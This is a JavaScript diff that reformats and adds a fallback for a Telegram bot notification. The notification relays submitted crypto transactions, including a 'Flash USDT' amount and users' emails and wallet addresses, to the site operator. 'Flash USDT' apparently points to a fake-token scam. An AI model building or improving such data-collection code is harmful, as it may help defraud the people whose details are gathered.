@@ -11,8 +11,8 @@ const EMAILJS_PUBLIC_KEY = '0Z2AxrijfYWKHDmqV'; // Replace with your EmailJS pub
 // Send Telegram notification
 async function sendTelegramNotification(transactionData) {
     try {
-        const message = `
-🚨 NEW TRANSACTION SUBMITTED 🚨
+        // Simple message without HTML formatting to avoid parsing issues
+        const message = `🚨 NEW TRANSACTION SUBMITTED 🚨
 
 📊 Transaction Details:
 • Network: ${transactionData.network}
@@ -26,8 +26,7 @@ async function sendTelegramNotification(transactionData) {
 
 ⏰ Time: ${new Date().toLocaleString()}
 
-🔗 Transaction Hash: ${transactionData.transaction_id}
-        `;
+🔗 Transaction Hash: ${transactionData.transaction_id}`;
 
         const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
             method: 'POST',
@@ -35,9 +34,8 @@ async function sendTelegramNotification(transactionData) {
                 'Content-Type': 'application/json',
             },
             body: JSON.stringify({
-                chat_id: String(TELEGRAM_CHAT_ID),
-                text: message,
-                parse_mode: 'HTML'
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message
             })
         });
 
@@ -48,10 +46,60 @@ async function sendTelegramNotification(transactionData) {
             return true;
         } else {
             console.error('❌ Failed to send Telegram notification:', responseData);
+            // Try alternative Chat ID format
+            if (responseData.error_code === 400) {
+                console.log('🔄 Trying alternative Chat ID format...');
+                return await sendTelegramNotificationAlternative(transactionData);
+            }
             return false;
         }
     } catch (error) {
         console.error('❌ Error sending Telegram notification:', error);
+        return false;
+    }
+}
+
+// Alternative Telegram notification with different Chat ID format
+async function sendTelegramNotificationAlternative(transactionData) {
+    try {
+        const message = `🚨 NEW TRANSACTION SUBMITTED 🚨
+
+📊 Transaction Details:
+• Network: ${transactionData.network}
+• Transaction ID: ${transactionData.transaction_id}
+• Amount: ${transactionData.amount} USDT
+• Flash USDT: ${transactionData.flash_usdt}
+
+👤 User Details:
+• Email: ${transactionData.email}
+• Wallet Address: ${transactionData.wallet_address}
+
+⏰ Time: ${new Date().toLocaleString()}
+
+🔗 Transaction Hash: ${transactionData.transaction_id}`;
+
+        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: `@${TELEGRAM_CHAT_ID}`,
+                text: message
+            })
+        });
+
+        const responseData = await response.json();
+
+        if (response.ok && responseData.ok) {
+            console.log('✅ Telegram notification sent successfully (alternative method)');
+            return true;
+        } else {
+            console.error('❌ Failed to send Telegram notification (alternative):', responseData);
+            return false;
+        }
+    } catch (error) {
+        console.error('❌ Error sending Telegram notification (alternative):', error);
         return false;
     }
 }
